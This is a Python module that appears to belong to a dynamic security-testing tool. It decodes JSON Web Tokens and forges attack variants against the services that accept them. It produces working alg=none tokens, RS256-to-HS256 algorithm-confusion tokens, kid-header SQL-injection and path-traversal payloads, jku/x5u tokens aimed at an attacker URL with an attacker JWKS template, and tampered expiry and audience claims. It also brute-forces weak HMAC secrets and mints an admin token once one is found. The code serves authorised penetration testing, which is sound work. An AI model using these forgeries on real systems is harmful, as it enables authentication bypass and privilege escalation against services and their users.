"""
JWT forensics and forge oracle.

Decodes and analyses JWT tokens, then generates forged variants to probe
all known JWT attack vectors:

  1. alg=none              — unsigned token accepted
  2. Algorithm confusion    — RS256 public key used as HS256 secret
  3. kid header injection   — SQL injection / path traversal in kid
  4. jku/x5u SSRF          — attacker-controlled JWKS URL
  5. Weak secret brute      — common secrets dictionary attack
  6. Expired token accepted — exp claim not validated
  7. aud/iss not validated  — audience / issuer claims ignored

Each forge function returns a signed (or unsigned) JWT string that can
be fed directly to the DAST http_request tool.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import struct
import time
from typing import Any


# ---------------------------------------------------------------------------
# Decode (no signature verification)

def decode_jwt(token: str) -> dict:
    """Decode a JWT without verifying its signature.

    Returns a dict with keys:
      header, payload, signature_b64, raw_header, raw_payload,
      alg, is_expired, claims_summary
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"error": f"expected 3 parts, got {len(parts)}"}

    try:
        header = json.loads(_b64_decode(parts[0]))
    except Exception as e:
        return {"error": f"header decode failed: {e}"}

    try:
        payload = json.loads(_b64_decode(parts[1]))
    except Exception as e:
        return {"error": f"payload decode failed: {e}"}

    now = int(time.time())
    exp = payload.get("exp")
    iat = payload.get("iat")
    nbf = payload.get("nbf")

    is_expired = isinstance(exp, int) and exp < now
    is_future = isinstance(nbf, int) and nbf > now

    return {
        "header": header,
        "payload": payload,
        "signature_b64": parts[2],
        "raw_header": parts[0],
        "raw_payload": parts[1],
        "alg": header.get("alg", "unknown"),
        "kid": header.get("kid"),
        "jku": header.get("jku"),
        "x5u": header.get("x5u"),
        "is_expired": is_expired,
        "is_future": is_future,
        "exp_human": _ts_human(exp),
        "iat_human": _ts_human(iat),
        "claims_summary": {
            "sub": payload.get("sub"),
            "iss": payload.get("iss"),
            "aud": payload.get("aud"),
            "roles": payload.get("roles") or payload.get("scope"),
        },
    }


# ---------------------------------------------------------------------------
# Forge functions — each returns a JWT string

def forge_none_alg(token: str) -> dict:
    """Forge a token with alg=none (no signature)."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    new_header = dict(decoded["header"])
    new_header["alg"] = "none"

    result = _build_unsigned(new_header, decoded["payload"])
    return {
        "attack": "alg_none",
        "description": "alg header changed to 'none' — signature stripped",
        "forged_token": result,
        "variants": [
            _build_unsigned({**new_header, "alg": "None"}, decoded["payload"]),
            _build_unsigned({**new_header, "alg": "NONE"}, decoded["payload"]),
            _build_unsigned({**new_header, "alg": "nOnE"}, decoded["payload"]),
        ],
    }


def forge_expired_accepted(token: str, shift_hours: int = -24) -> dict:
    """Forge a token with exp in the past (or extended into the future)."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    new_payload = dict(decoded["payload"])
    now = int(time.time())

    if shift_hours < 0:
        new_payload["exp"] = now + (shift_hours * 3600)
    else:
        new_payload["exp"] = now + (shift_hours * 3600)
        new_payload["iat"] = now

    result = _build_unsigned(decoded["header"], new_payload)
    return {
        "attack": "expired_token",
        "description": f"exp shifted by {shift_hours}h — tests whether server validates expiry",
        "forged_token": result,
        "original_exp": decoded["payload"].get("exp"),
        "new_exp": new_payload["exp"],
    }


def forge_aud_confusion(token: str, target_audience: str) -> dict:
    """Forge a token with a different aud claim."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    new_payload = dict(decoded["payload"])
    original_aud = new_payload.get("aud")
    new_payload["aud"] = target_audience

    result = _build_unsigned(decoded["header"], new_payload)
    return {
        "attack": "aud_confusion",
        "description": f"aud changed from {original_aud!r} to {target_audience!r}",
        "forged_token": result,
        "original_aud": original_aud,
    }


def forge_kid_injection(token: str) -> dict:
    """Forge tokens with injected kid header values."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    payloads_list = [
        ("sql_union",       "' UNION SELECT 'lacuna-injected' -- "),
        ("sql_comment",     "x' OR '1'='1"),
        ("path_traversal",  "../../dev/null"),
        ("path_etc_passwd", "/etc/passwd"),
        ("null_byte",       "\x00"),
    ]

    forged: list[dict] = []
    for name, kid_val in payloads_list:
        new_header = dict(decoded["header"])
        new_header["kid"] = kid_val
        forged.append({
            "variant": name,
            "kid": kid_val,
            "forged_token": _build_unsigned(new_header, decoded["payload"]),
        })

    return {
        "attack": "kid_injection",
        "description": "kid header injected with SQL/path-traversal payloads",
        "forged_variants": forged,
    }


def forge_jku_ssrf(token: str, attacker_url: str) -> dict:
    """Forge a token that points jku/x5u at an attacker-controlled URL."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    new_header = dict(decoded["header"])
    new_header["jku"] = attacker_url
    forged_jku = _build_unsigned(new_header, decoded["payload"])

    new_header2 = dict(decoded["header"])
    new_header2["x5u"] = attacker_url
    forged_x5u = _build_unsigned(new_header2, decoded["payload"])

    return {
        "attack": "jku_ssrf",
        "description": (
            f"jku/x5u header set to {attacker_url!r} — "
            "server would fetch attacker-controlled JWKS"
        ),
        "forged_jku_token": forged_jku,
        "forged_x5u_token": forged_x5u,
        "attacker_jwks_template": _build_attacker_jwks(),
    }


def forge_hs256_with_public_key(token: str, public_key_pem: str) -> dict:
    """Algorithm confusion: RS256 → HS256, signing with the public key as secret."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    if decoded["alg"] not in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
        return {"error": f"token uses {decoded['alg']}, not an asymmetric algorithm"}

    new_header = dict(decoded["header"])
    new_header["alg"] = "HS256"
    new_header.pop("kid", None)
    new_header.pop("jku", None)

    secret = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
    forged = _build_hs256(new_header, decoded["payload"], secret)

    return {
        "attack": "alg_confusion_rs256_to_hs256",
        "description": (
            "Algorithm changed RS256→HS256 with public key as HMAC secret. "
            "Exploits servers that allow both symmetric and asymmetric JWT verification."
        ),
        "forged_token": forged,
    }


def brute_force_secret(token: str, wordlist: list[str] | None = None) -> dict:
    """Try a list of common secrets against an HS256/HS384/HS512 token."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    alg = decoded["alg"]
    if alg not in ("HS256", "HS384", "HS512"):
        return {"error": f"token uses {alg}, not an HMAC algorithm — cannot brute-force"}

    if wordlist is None:
        wordlist = _DEFAULT_SECRETS

    parts = token.strip().split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    sig_bytes = _b64_decode_raw(parts[2])

    alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = alg_map[alg]

    for secret in wordlist:
        candidate = hmac.new(
            secret.encode() if isinstance(secret, str) else secret,
            signing_input,
            hash_fn,
        ).digest()
        if hmac.compare_digest(candidate, sig_bytes):
            return {
                "attack": "weak_secret",
                "description": f"JWT secret found: {secret!r}",
                "secret": secret,
                "forged_admin_token": _build_hs256(
                    decoded["header"],
                    {**decoded["payload"], "role": "admin", "is_admin": True},
                    secret.encode(),
                ),
            }

    return {
        "attack": "weak_secret",
        "description": f"No match found in {len(wordlist)}-entry wordlist",
        "secret": None,
    }


# ---------------------------------------------------------------------------
# Full analysis: decode + report all attack vectors

def analyse(token: str, oob_url: str = "") -> dict:
    """Comprehensive JWT analysis — decode + enumerate all attack vectors."""
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded

    attacks: list[dict] = []

    attacks.append({
        "name": "alg_none",
        "severity": "critical",
        "payload": forge_none_alg(token),
    })

    attacks.append({
        "name": "expired_accepted",
        "severity": "high",
        "payload": forge_expired_accepted(token, shift_hours=-48),
    })

    attacks.append({
        "name": "kid_injection",
        "severity": "high",
        "payload": forge_kid_injection(token),
    })

    attacks.append({
        "name": "aud_confusion",
        "severity": "medium",
        "payload": forge_aud_confusion(token, "internal-service"),
    })

    if oob_url:
        attacks.append({
            "name": "jku_ssrf",
            "severity": "high",
            "payload": forge_jku_ssrf(token, oob_url),
        })

    brute = brute_force_secret(token)
    if brute.get("secret"):
        attacks.append({
            "name": "weak_secret",
            "severity": "critical",
            "payload": brute,
        })

    return {
        "decoded": decoded,
        "attacks": attacks,
        "recommendations": _recommendations(decoded),
    }


# ---------------------------------------------------------------------------
# Private helpers

def _b64_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64_decode_raw(s: str) -> bytes:
    return _b64_decode(s)


def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _build_unsigned(header: dict, payload: dict) -> str:
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _build_hs256(header: dict, payload: dict, secret: bytes) -> str:
    alg = header.get("alg", "HS256")
    alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = alg_map.get(alg, hashlib.sha256)
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hash_fn).digest()
    return f"{h}.{p}.{_b64_encode(sig)}"


def _ts_human(ts: int | None) -> str | None:
    if ts is None:
        return None
    import datetime
    try:
        return datetime.datetime.utcfromtimestamp(ts).isoformat() + "Z"
    except (OSError, OverflowError, ValueError):
        return str(ts)


def _build_attacker_jwks() -> dict:
    """Return a minimal JWKS template that an attacker would serve."""
    return {
        "keys": [{
            "kty": "oct",
            "k": _b64_encode(b"attacker-controlled-secret-key-1234"),
            "alg": "HS256",
            "use": "sig",
        }]
    }


def _recommendations(decoded: dict) -> list[str]:
    recs: list[str] = []
    alg = decoded.get("alg", "")
    if alg in ("none", "None", "NONE"):
        recs.append("CRITICAL: alg=none in production token — algorithm validation is disabled")
    if alg.startswith("HS"):
        recs.append("Use RS256/ES256 (asymmetric) instead of HMAC — secret sharing is a liability")
    if not decoded.get("payload", {}).get("exp"):
        recs.append("Token has no exp claim — tokens never expire")
    if not decoded.get("payload", {}).get("aud"):
        recs.append("Token has no aud claim — vulnerable to audience confusion attacks")
    if decoded.get("jku") or decoded.get("x5u"):
        recs.append("Token has jku/x5u — server must validate URL against allowlist")
    if decoded.get("kid"):
        recs.append("Token has kid — server must sanitize kid before using in DB/FS lookups")
    return recs


_DEFAULT_SECRETS = [
    "secret", "Secret", "SECRET",
    "password", "Password", "PASSWORD",
    "changeme", "changeit",
    "jwt_secret", "jwt-secret", "jwtSecret",
    "your-256-bit-secret",
    "your-secret-key",
    "supersecret", "supersecretkey",
    "mysecret", "mySecret",
    "1234567890",
    "abcdefghijklmnopqrstuvwxyz",
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "lacuna", "lacuna-secret",
    "development", "production",
    "test", "testing",
    "app_secret", "app-secret",
    "django-insecure-",
    "flask-secret",
    "laravel-secret",
    "",
]
